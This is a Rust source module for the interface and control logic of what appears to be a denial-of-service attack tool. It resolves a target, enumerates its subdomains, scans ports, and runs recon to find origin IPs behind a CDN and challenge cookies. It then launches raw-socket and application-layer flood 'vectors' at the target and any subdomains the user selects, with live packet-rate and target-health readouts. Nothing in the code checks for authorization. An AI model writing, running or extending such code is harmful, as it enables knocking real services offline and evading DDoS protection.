//! Application state and input handling.

use std::collections::VecDeque;
use std::net::Ipv4Addr;
use std::sync::atomic::{AtomicBool, AtomicU32};
use std::sync::Arc;
use std::time::Instant;

use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
use tokio::sync::mpsc;

use crate::attack::{self, Ctx};
use crate::bypass;
use crate::health::{self, Health};
use crate::net::raw::{self, Iface, RawSock};
use crate::stats::Stats;
use crate::target::{self, Target};
use crate::vectors::{self, Vector, ALL};

#[derive(Clone, Copy, PartialEq, Eq)]
pub enum Phase {
    Input,
    Scanning,
    Ready,
    Running,
    Stopped,
    Subdomains,
    SubPrompt,
    Layers,
}

pub struct SubSel {
    pub name: String,
    pub ips: Vec<Ipv4Addr>,
    pub selected: bool,
}

pub struct ScanOutcome {
    pub target: Result<(Target, Vec<bypass::Sub>), String>,
}

pub struct App {
    pub target_input: String,
    pub port_input: String,
    pub minutes_input: String,
    pub focus: usize,
    pub phase: Phase,
    pub target: Option<Target>,
    pub cursor: usize,
    pub auto_mode: bool,
    pub stats: Option<Arc<Stats>>,
    pub log: Vec<String>,
    pub message: String,
    pub iface: Option<Iface>,
    pub raw_ok: bool,
    pub quit: bool,
    pub pps: f64,
    pub bps: f64,
    pub open_ports: Vec<u16>,
    pub scan_seen: u32,
    pub scan_total: u32,
    pub started_at: Option<Instant>,
    pub deadline: Option<Instant>,
    pub limit_secs: u64,
    pub health: Option<Arc<Health>>,
    pub recon: Option<Arc<bypass::Recon>>,
    pub subs: Vec<SubSel>,
    pub sub_cursor: usize,
    pub targets: Vec<Target>,
    pub layers: Vec<u8>,
    pub layer_domain: usize,
    pub layer_col: usize,
    samples: VecDeque<(Instant, u64, u64)>,
    scan_rx: Option<mpsc::Receiver<ScanOutcome>>,
    port_rx: Option<mpsc::UnboundedReceiver<u16>>,
    recon_rx: Option<mpsc::Receiver<bypass::Recon>>,
    health_stop: Option<Arc<AtomicBool>>,
}

impl App {
    pub fn new() -> Self {
        let mut log = Vec::new();
        let (iface, raw_ok) = match raw::discover() {
            Ok(i) => {
                let ok = RawSock::open(&i).is_ok();
                log.push(format!(
                    "interface {} ({}), raw sockets: {}",
                    i.name,
                    i.ip,
                    if ok { "ok" } else { "unavailable" }
                ));
                (Some(i), ok)
            }
            Err(e) => {
                log.push(format!("no raw interface: {e}"));
                (None, false)
            }
        };
        if !raw_ok {
            log.push("L1-L4 raw vectors disabled (need root + CAP_NET_RAW)".into());
        }
        Self {
            target_input: String::new(),
            port_input: String::new(),
            minutes_input: String::new(),
            focus: 0,
            phase: Phase::Input,
            target: None,

            cursor: 0,
            auto_mode: true,
            stats: None,
            log,
            message: "enter a target, then press Enter to scan".into(),
            iface,
            raw_ok,
            quit: false,
            pps: 0.0,
            bps: 0.0,
            open_ports: Vec::new(),
            scan_seen: 0,
            scan_total: 0,
            started_at: None,
            deadline: None,
            limit_secs: 0,
            samples: VecDeque::new(),
            scan_rx: None,
            port_rx: None,
            recon_rx: None,
            health_stop: None,
            health: None,
            recon: None,
            subs: Vec::new(),
            sub_cursor: 0,
            targets: Vec::new(),
            layers: Vec::new(),
            layer_domain: 0,
            layer_col: 0,
        }
    }

    pub fn note(&mut self, s: impl Into<String>) {
        let s = s.into();
        self.log.push(s);
        if self.log.len() > 300 {
            self.log.remove(0);
        }
    }


    fn layer_bit(layer: &str) -> u8 {
        match layer {
            "L1" => 1,
            "L2" => 2,
            "L3" => 4,
            "L4" => 8,
            "L5" => 16,
            "L6" => 32,
            "L7" => 64,
            _ => 0,
        }
    }

    /// Auto-pick layers for one target from its detected service.
    fn auto_layers_for(&mut self, idx: usize) {
        let Some(t) = self.targets.get(idx) else { return };
        let plan = vectors::plan_for(t.service, t.port, self.raw_ok);
        let mut mask = 0u8;
        for v in plan {
            mask |= Self::layer_bit(v.spec().layer);
        }
        if let Some(slot) = self.layers.get_mut(idx) {
            *slot = mask;
        }
    }

    fn auto_layers_all(&mut self) {
        for i in 0..self.targets.len() {
            self.auto_layers_for(i);
        }
    }

    /// Union of the selected layers across all targets.
    pub fn active_mask(&self) -> u8 {
        self.layers.iter().fold(0u8, |a, b| a | b)
    }

    /// Vectors implied by the selected layers for one target.
    fn vectors_for_domain(&self, idx: usize) -> Vec<Vector> {
        let mask = self.layers.get(idx).copied().unwrap_or(0);
        ALL.iter()
            .filter(|s| mask & Self::layer_bit(s.layer) != 0)
            .filter(|s| !s.raw || self.raw_ok)
            .map(|s| s.vector)
            .collect()
    }

    pub fn start_scan(&mut self) {
        let input = self.target_input.clone();
        let port = self.port_input.clone();
        let mut t = match Target::parse(&input, &port) {
            Ok(t) => t,
            Err(e) => {
                self.message = e;
                return;
            }
        };
        let minutes = self.minutes_input.trim().to_string();
        self.limit_secs = if minutes.is_empty() {
            0
        } else {
            match minutes.parse::<u64>() {
                Ok(m) => m.saturating_mul(60),
                Err(_) => {
                    self.message = "minutes must be a number (0 = unlimited)".into();
                    return;
                }
            }
        };

        self.phase = Phase::Scanning;
        self.open_ports.clear();
        self.scan_seen = 0;
        self.scan_total = 0;
        self.message = "resolving target...".into();

        let (tx, rx) = mpsc::channel(1);
        let (ptx, prx) = mpsc::unbounded_channel();
        self.scan_rx = Some(rx);
        self.port_rx = Some(prx);

        tokio::spawn(async move {
            let res = async {
                t.resolve()?;
                let ip = t.primary().ok_or("target has no address")?;
                // Subdomains are always loaded first, before any port work.
                let names = bypass::crt_sh(&t.host).await;
                let subs = if names.is_empty() {
                    Vec::new()
                } else {
                    let mut n = names;
                    n.truncate(200);
                    bypass::verify_subs(n).await
                };
                if t.port.is_none() {
                    let progress = Arc::new(AtomicU32::new(0));
                    let ports = target::scan_all_ports(ip, ptx, progress).await;
                    let (svc, chosen) = target::best_service(&ports);
                    t.service = svc;
                    t.port = chosen;
                    if svc == target::Service::Https {
                        t.tls = true;
                    }
                    if chosen.is_some() {
                        let _ = target::fingerprint(&mut t);
                    }
                } else {
                    target::fingerprint(&mut t)?;
                }
                Ok::<(Target, Vec<bypass::Sub>), String>((t, subs))
            }
            .await;
            let _ = tx.send(ScanOutcome { target: res }).await;
        });
    }

    pub fn poll_scan(&mut self) {
        if let Some(rx) = self.port_rx.as_mut() {
            while let Ok(p) = rx.try_recv() {
                self.open_ports.push(p);
                self.open_ports.sort_unstable();
                self.scan_seen += 1;
            }
        }
        let Some(rx) = self.scan_rx.as_mut() else {
            return;
        };
        let Some(out) = rx.try_recv().ok() else {
            return;
        };
        self.scan_rx = None;
        self.port_rx = None;
        match out.target {
            Ok((t, subs)) => {
                let ips = t
                    .ips
                    .iter()
                    .map(|i| i.to_string())
                    .collect::<Vec<_>>()
                    .join(", ");
                let ports = if self.open_ports.is_empty() {
                    "-".to_string()
                } else {
                    self.open_ports
                        .iter()
                        .map(|p| p.to_string())
                        .collect::<Vec<_>>()
                        .join(",")
                };
                self.note(format!(
                    "target {} -> {} | service: {} | port {} | open: {} | {} subdomains",
                    t.input,
                    ips,
                    t.service.label(),
                    t.port.map(|p| p.to_string()).unwrap_or_else(|| "-".into()),
                    ports,
                    subs.len()
                ));
                self.target = Some(t);
                self.targets = self.target.iter().cloned().collect();
                self.layers = vec![0u8];
                self.layer_domain = 0;
                self.layer_col = 0;
                self.subs = subs
                    .iter()
                    .map(|s| SubSel {
                        name: s.name.clone(),
                        ips: s.ips.clone(),
                        selected: false,
                    })
                    .collect();
                self.sub_cursor = 0;

                if self.subs.is_empty() {
                    self.auto_layers_all();
                    self.phase = Phase::Layers;
                    self.message =
                        "no subdomains - choose layers, Enter to start".into();
                } else {
                    self.phase = Phase::SubPrompt;
                    self.message = format!(
                        "{} subdomains found - attack them too? [y/N]",
                        self.subs.len()
                    );
                }

                // Recon runs after the target is known: CDN detection, origin
                // discovery and challenge handling.
                let ips = self.target.as_ref().map(|t| t.ips.clone()).unwrap_or_default();
                if let Some(t) = &self.target {
                    let port = t.port.unwrap_or(if t.tls { 443 } else { 80 });
                    let tls = t.tls;
                    let host = t.host.clone();
                    let (tx, rx) = mpsc::channel(1);
                    self.recon_rx = Some(rx);
                    tokio::spawn(async move {
                        let r = bypass::run(&ips, port, tls, &host).await;
                        let _ = tx.send(r).await;
                    });
                }
            }
            Err(e) => {
                self.note(format!("scan failed: {e}"));
                self.message = e;
                self.phase = Phase::Input;
            }
        }
    }

    pub fn poll_recon(&mut self) {
        let Some(rx) = self.recon_rx.as_mut() else {
            return;
        };
        let Some(r) = rx.try_recv().ok() else {
            return;
        };
        self.recon_rx = None;
        self.note(format!("recon: {}", bypass::summary(&r)));
        self.recon = Some(Arc::new(r));
    }

    pub fn begin_attack(&mut self) {
        let Some(t) = self.target.clone() else {
            self.message = "scan a target first".into();
            return;
        };
        if self.targets.is_empty() {
            self.targets = vec![t.clone()];
            self.layers = vec![0u8];
            self.auto_layers_all();
        }
        let Some(ip) = t.primary() else {
            self.message = "target has no address".into();
            return;
        };
        let default_port = t.port.unwrap_or(if t.tls { 443 } else { 80 });

        let stats = Arc::new(Stats::new());
        let raw = if self.raw_ok {
            self.iface
                .as_ref()
                .and_then(|i| RawSock::open(i).ok())
                .map(Arc::new)
        } else {
            None
        };

        let budgets: Vec<Arc<attack::Budget>> = ALL
            .iter()
            .map(|s| Arc::new(attack::Budget::new(attack::raw_rate(s.vector))))
            .collect();
        attack::spawn_refill(budgets.clone(), stats.clone());
        let cookie = self.recon.as_ref().and_then(|r| r.cookie.clone());

        let mut launched = 0usize;
        let mut total_vectors = 0usize;
        for idx in 0..self.targets.len() {
            let vectors = self.vectors_for_domain(idx);
            if vectors.is_empty() {
                continue;
            }
            let tg = self.targets[idx].clone();
            let tp = tg.port.unwrap_or_else(|| {
                vectors
                    .first()
                    .map(|v| vectors::default_port(*v))
                    .unwrap_or(default_port)
            });
            let ctx = Arc::new(Ctx {
                target: tg,
                port: tp,
                iface: self.iface.clone(),
                raw: raw.clone(),
                stats: stats.clone(),
                cookie: cookie.clone(),
                budgets: budgets.clone(),
            });
            attack::launch(ctx, vectors.clone());
            launched += 1;
            total_vectors += vectors.len();
        }
        if launched == 0 {
            self.message = "no layers selected".into();
            return;
        }

        let h = Arc::new(Health::new());
        let stop = Arc::new(AtomicBool::new(false));
        health::spawn(h.clone(), ip, default_port, stop.clone());
        self.health = Some(h);
        self.health_stop = Some(stop);

        self.note(format!(
            "attacking {ip}:{default_port} with {total_vectors} vectors on {launched} target(s){}",
            if self.limit_secs > 0 {
                format!(" for {}m", self.limit_secs / 60)
            } else {
                String::new()
            }
        ));
        self.stats = Some(stats);
        self.started_at = Some(Instant::now());
        self.deadline = if self.limit_secs > 0 {
            Some(Instant::now() + std::time::Duration::from_secs(self.limit_secs))
        } else {
            None
        };
        self.samples.clear();
        self.phase = Phase::Running;
        self.message = "running - Enter/x to stop".into();
    }

    pub fn stop_attack(&mut self) {
        if let Some(s) = &self.stats {
            s.stop();
        }
        if let Some(s) = &self.health_stop {
            s.store(true, std::sync::atomic::Ordering::Relaxed);
        }
        self.deadline = None;
        self.phase = Phase::Stopped;
        self.message = "stopped - Enter to restart, Esc to edit target".into();
        self.note("attack stopped".to_string());
    }

    pub fn remaining(&self) -> Option<u64> {
        self.deadline
            .map(|d| d.saturating_duration_since(Instant::now()).as_secs())
    }

    pub fn tick(&mut self) {
        self.poll_recon();
        if self.phase == Phase::Running {
            if let Some(d) = self.deadline {
                if Instant::now() >= d {
                    self.stop_attack();
                    self.message = "time limit reached".into();
                }
            }
        }
        let Some(s) = &self.stats else { return };
        let now = Instant::now();
        let p = s.total_packets();
        let b = s.total_bytes();
        self.samples.push_back((now, p, b));
        while self.samples.len() > 2
            && now.duration_since(self.samples.front().unwrap().0).as_secs_f64() > 2.0
        {
            self.samples.pop_front();
        }
        if let Some((t0, p0, b0)) = self.samples.front().copied() {
            let dt = now.duration_since(t0).as_secs_f64();
            if dt > 0.2 {
                self.pps = (p.saturating_sub(p0)) as f64 / dt;
                self.bps = (b.saturating_sub(b0)) as f64 / dt;
            }
        }
    }

    pub fn handle_key(&mut self, k: KeyEvent) {
        if k.modifiers.contains(KeyModifiers::CONTROL) && k.code == KeyCode::Char('c') {
            self.quit = true;
            return;
        }
        match self.phase {
            Phase::Input | Phase::Scanning => self.key_input(k),
            Phase::Ready => self.key_ready(k),
            Phase::Running => self.key_running(k),
            Phase::Stopped => self.key_stopped(k),
            Phase::Subdomains => self.key_subs(k),
            Phase::SubPrompt => self.key_subprompt(k),
            Phase::Layers => self.key_layers(k),
        }
    }

    fn key_subprompt(&mut self, k: KeyEvent) {
        match k.code {
            KeyCode::Char('y') | KeyCode::Char('Y') | KeyCode::Enter => {
                if self.subs.is_empty() {
                    self.to_layers();
                } else {
                    self.phase = Phase::Subdomains;
                    self.message =
                        "Space select, a all, Enter confirm, Esc skip".into();
                }
            }
            KeyCode::Char('n') | KeyCode::Char('N') | KeyCode::Esc => {
                self.subs.clear();
                self.to_layers();
            }
            _ => {}
        }
    }

    fn to_layers(&mut self) {
        self.targets = self.target.iter().cloned().collect();
        self.layers = vec![0u8; self.targets.len()];
        self.layer_domain = 0;
        self.layer_col = 0;
        self.auto_layers_all();
        self.phase = Phase::Layers;
        self.message = "Up/Down domain, Left/Right layer, Space toggle, a auto, s all, Enter start".into();
    }

    fn key_layers(&mut self, k: KeyEvent) {
        let n = self.targets.len();
        match k.code {
            KeyCode::Up => self.layer_domain = self.layer_domain.saturating_sub(1),
            KeyCode::Down => {
                if n > 0 {
                    self.layer_domain = (self.layer_domain + 1).min(n - 1);
                }
            }
            KeyCode::Left => self.layer_col = self.layer_col.saturating_sub(1),
            KeyCode::Right => self.layer_col = (self.layer_col + 1).min(6),
            KeyCode::Char(' ') => {
                let bit = 1u8 << self.layer_col;
                if let Some(m) = self.layers.get_mut(self.layer_domain) {
                    *m ^= bit;
                }
            }
            KeyCode::Char('a') => {
                self.auto_layers_all();
                self.message = "auto layers for every domain".into();
            }
            KeyCode::Char('s') => {
                for m in &mut self.layers {
                    *m = 0x7f;
                }
                self.message = "all layers armed".into();
            }
            KeyCode::Char('n') => {
                for m in &mut self.layers {
                    *m = 0;
                }
                self.message = "all layers cleared".into();
            }
            KeyCode::Enter => {
                if self.layers.iter().any(|m| *m != 0) {
                    self.phase = Phase::Ready;
                    self.message = "Enter to start, Esc back to layers".into();
                } else {
                    self.message = "no layers selected".into();
                }
            }
            KeyCode::Esc => {
                self.phase = Phase::Input;
                self.focus = 0;
            }
            _ => {}
        }
    }

    fn key_subs(&mut self, k: KeyEvent) {
        match k.code {
            KeyCode::Up => self.sub_cursor = self.sub_cursor.saturating_sub(1),
            KeyCode::Down => {
                if !self.subs.is_empty() {
                    self.sub_cursor = (self.sub_cursor + 1).min(self.subs.len() - 1);
                }
            }
            KeyCode::Char(' ') => {
                if let Some(s) = self.subs.get_mut(self.sub_cursor) {
                    s.selected = !s.selected;
                }
            }
            KeyCode::Char('a') => {
                let all = self.subs.iter().all(|s| s.selected);
                for s in &mut self.subs {
                    s.selected = !all;
                }
            }
            KeyCode::Enter => {
                let mut targets: Vec<Target> = self.target.iter().cloned().collect();
                for s in self.subs.iter().filter(|s| s.selected) {
                    if let Some(mut t) = self.target.clone() {
                        t.host = s.name.clone();
                        t.ips = s.ips.clone();
                        t.service = target::classify_port(t.port.unwrap_or(80));
                        targets.push(t);
                    }
                }
                self.targets = targets;
                self.layers = vec![0u8; self.targets.len()];
                self.layer_domain = 0;
                self.layer_col = 0;
                self.auto_layers_all();
                self.phase = Phase::Layers;
                self.message = format!(
                    "{} domains - Up/Down, Left/Right layer, Space toggle, a auto, s all, Enter start",
                    self.targets.len()
                );
            }
            KeyCode::Esc => {
                self.subs.clear();
                self.to_layers();
            }
            _ => {}
        }
    }

    fn key_input(&mut self, k: KeyEvent) {
        match k.code {
            KeyCode::Char(c) => {
                if self.focus == 0 {
                    self.target_input.push(c);
                } else if c.is_ascii_digit() {
                    let field = if self.focus == 1 {
                        &mut self.port_input
                    } else {
                        &mut self.minutes_input
                    };
                    if field.len() < 5 {
                        field.push(c);
                    }
                }
            }
            KeyCode::Backspace => match self.focus {
                0 => {
                    self.target_input.pop();
                }
                1 => {
                    self.port_input.pop();
                }
                _ => {
                    self.minutes_input.pop();
                }
            },
            KeyCode::Tab => self.focus = (self.focus + 1) % 3,
            KeyCode::BackTab => self.focus = (self.focus + 2) % 3,
            KeyCode::Enter => self.start_scan(),
            KeyCode::Esc => {
                if self.target_input.is_empty()
                    && self.port_input.is_empty()
                    && self.minutes_input.is_empty()
                {
                    self.quit = true;
                } else {
                    self.target_input.clear();
                    self.port_input.clear();
                    self.minutes_input.clear();
                }
            }
            _ => {}
        }
    }

    fn key_ready(&mut self, k: KeyEvent) {
        match k.code {
            KeyCode::Enter => self.begin_attack(),
            KeyCode::Esc => {
                self.phase = Phase::Layers;
                self.message = "Up/Down domain, Left/Right layer, Space toggle".into();
            }
            KeyCode::Char('o') => {
                let ip = self.recon.as_ref().and_then(|r| r.origins.first().copied());
                match ip {
                    Some(ip) => {
                        if let Some(t) = self.target.as_mut() {
                            t.ips = vec![ip];
                        }
                        if let Some(t) = self.targets.first_mut() {
                            t.ips = vec![ip];
                        }
                        self.note(format!("retargeted to origin {ip}"));
                        self.message = format!("targeting origin {ip} directly");
                    }
                    None => {
                        self.message = if self.recon.is_some() {
                            "no origin found".into()
                        } else {
                            "recon still running".into()
                        }
                    }
                }
            }
            _ => {}
        }
    }

    fn key_running(&mut self, k: KeyEvent) {
        match k.code {
            KeyCode::Enter | KeyCode::Char('x') => self.stop_attack(),
            KeyCode::Char('q') => self.quit = true,
            _ => {}
        }
    }

    fn key_stopped(&mut self, k: KeyEvent) {
        match k.code {
            KeyCode::Enter => self.begin_attack(),
            KeyCode::Esc => {
                self.phase = Phase::Input;
                self.focus = 0;
            }
            KeyCode::Char('q') => self.quit = true,
            _ => {}
        }
    }

    pub fn service_label(&self) -> &'static str {
        self.target
            .as_ref()
            .map(|t| t.service.label())
            .unwrap_or("not scanned")
    }

    pub fn is_tls(&self) -> bool {
        self.target.as_ref().map(|t| t.tls).unwrap_or(false)
    }
}

impl Default for App {
    fn default() -> Self {
        Self::new()
    }
}
